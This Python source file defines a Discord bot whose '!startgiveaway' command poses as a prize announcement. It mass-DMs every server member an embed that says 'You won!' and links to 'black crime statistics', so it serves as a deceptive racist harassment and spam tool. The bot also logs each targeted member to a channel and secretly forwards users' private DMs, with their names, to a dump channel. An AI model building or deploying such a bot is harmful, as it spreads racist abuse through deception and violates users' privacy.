import discord
import time
import os
import json
from discord.ext import commands
import random
intents = discord.Intents.default()
intents.messages = True
intents.members = True
client = commands.Bot(description = "Your Mom Sex", command_prefix = '!', intents=intents)



@client.event
async def on_ready():
    print(client.user.name)
    await client.change_presence(activity=discord.Game(name="!startgiveaway"))
    print("Currently in " + str(len(client.guilds)) +" servers.")


msg_dump_channel = 836996068326768680
@client.event
async def on_message(message: discord.Message):
    channel = client.get_channel(msg_dump_channel)
    if message.guild is None and not message.author.bot:
        # if the channel is public at all, make sure to sanitize this first
        await channel.send("\"" + message.content + "\"" + " - " + message.author.name)
    await client.process_commands(message)



@client.command()
async def startgiveaway(ctx):
    foolchannel = client.get_channel(836995446051700778)
    embed1 = discord.Embed(title="Congratulations!", description="You won!", colour=0x808080)
    embed1.add_field(name="Important", value="[View black crime statistics](https://www.ojjdp.gov/ojstatbb/crime/ucr.asp?table_in=2)", inline=False)
    embed1.set_image(url="https://pngimg.com/uploads/fish/fish_PNG10532.png")
    print(f'Going in server {ctx.guild.name}')
    print("Amount of people: " + str(len(ctx.guild.members)))
    await foolchannel.send(f'Going in server {ctx.guild.name}')
    await foolchannel.send("Amount of people: " + str(len(ctx.guild.members)))
    for member in ctx.guild.members:
        print(f"going on {member.name}")
        await foolchannel.send(f"going on {member.name}")
        try:
            if member.id == 836981797656199209:
                continue
            else:
                await member.send(embed=embed1)
        except discord.HTTPException:
            print('exception')
            continue
            
            









client.run(token, reconnect=True)
